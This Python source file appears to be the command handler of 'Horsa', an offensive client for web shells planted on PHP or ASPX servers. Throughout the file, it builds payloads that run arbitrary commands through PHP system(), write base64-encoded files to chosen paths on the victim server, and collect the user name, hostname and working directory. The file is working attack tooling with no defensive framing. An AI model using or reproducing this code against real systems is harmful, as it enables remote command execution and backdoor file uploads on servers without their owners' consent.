from core.request import Request
from core.config import help_banner
from colorama import Fore

class Handler:
    """
    -------------
    PHP MODULES
    -------------
    """
    shell_php = "system('CMD_REPLACE 2>&1');"
    upload_php = "file_put_contents('RPATH', base64_decode('B64_DATA'));" # The payload is base64 encoded before being transmitted
    username_php = "echo get_current_user();"
    hostname_php = "echo gethostname();"
    pwd_php = "echo getcwd();"

    def __init__(self, lang, cmd):
        self.cmd = str(cmd.split()[0])
        self.args = ' '.join(cmd.split()[1:])
        self.lang = lang

    @staticmethod
    def get_help():
        print(help_banner)

    @staticmethod
    def write_from_file(filename):
        with open(filename, 'rb') as file:  # Open the file in binary mode to handle both text and binary files
            content = file.read()
            return content
    
    @staticmethod
    def write_to_file(filename, content):
            with open(filename, 'wb') as file: 
                file.write(content)
            
    def get_command(self):
        self.selected_command = ""
        try:
            if self.cmd == ":help":
                self.get_help()
            elif self.lang == "php":
                if self.cmd == ":shell":
                    self.selected_command = Handler.shell_php.replace("CMD_REPLACE", self.args)
                elif self.cmd == ":upload":
                    data = Request.encode_base64(self.write_from_file(self.args.split()[0]))
                    self.selected_command = Handler.upload_php.replace("RPATH", self.args.split()[1]).replace("B64_DATA", data)
                elif self.cmd == ":username":
                    self.selected_command = Handler.username_php
                elif self.cmd == ":hostname":
                    self.selected_command = Handler.hostname_php
                elif self.cmd == ":pwd":
                    self.selected_command = Handler.pwd_php
                else:
                    print(Fore.RED + "[!]" + Fore.WHITE + " Unknown command, use :help to list modules and show help") 
            elif self.lang == "aspx":
                if self.cmd == ":shell":
                    self.selected_command = self.args
                elif self.cmd == ":username":
                    self.selected_command = self.args
                elif self.cmd == ":pwd":
                    self.selected_command = self.args
                elif self.cmd == ":hostname":
                    self.selected_command = self.args
                elif self.cmd == ":upload":
                    data = Request.encode_base64(self.write_from_file(self.args.split()[0]))
                    self.selected_command = self.cmd + " " + self.args.split()[1] + " " + data
                else:
                    print(Fore.RED + "[!]" + Fore.WHITE + " Unknown command, use :help to list modules and show help")
            else:
                print(Fore.RED + "[!]" + Fore.WHITE + " Unknown language, use --lang php or --lang aspx when running Horsa") 
                exit(0)
            return self.selected_command
        except Exception as e:
            print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred when handling command: " + str(e))
